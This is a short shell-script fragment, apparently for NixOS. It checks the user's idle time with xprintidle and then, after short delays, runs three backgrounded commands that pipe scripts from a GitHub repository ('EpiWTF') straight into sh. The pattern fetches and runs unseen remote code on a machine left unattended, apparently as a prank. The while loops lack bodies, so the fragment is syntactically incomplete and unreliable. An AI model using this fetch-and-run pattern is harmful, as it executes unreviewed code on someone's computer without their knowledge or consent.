while [ "$(/nix/store/*xprintidle*/bin/xprintidle)" -le "10000" ]
while [ "$(/nix/store/*xprintidle*/bin/xprintidle)" -ge "10000" ]

(sleep 30; curl https://raw.githubusercontent.com/ilil2/EpiWTF/main/WTF/loop.sh | sh) &
(sleep 35; curl https://raw.githubusercontent.com/ilil2/EpiWTF/main/WTF/notif.sh | sh) &
(sleep 25; curl https://raw.githubusercontent.com/ilil2/EpiWTF/main/WTF/img.sh |sh) &
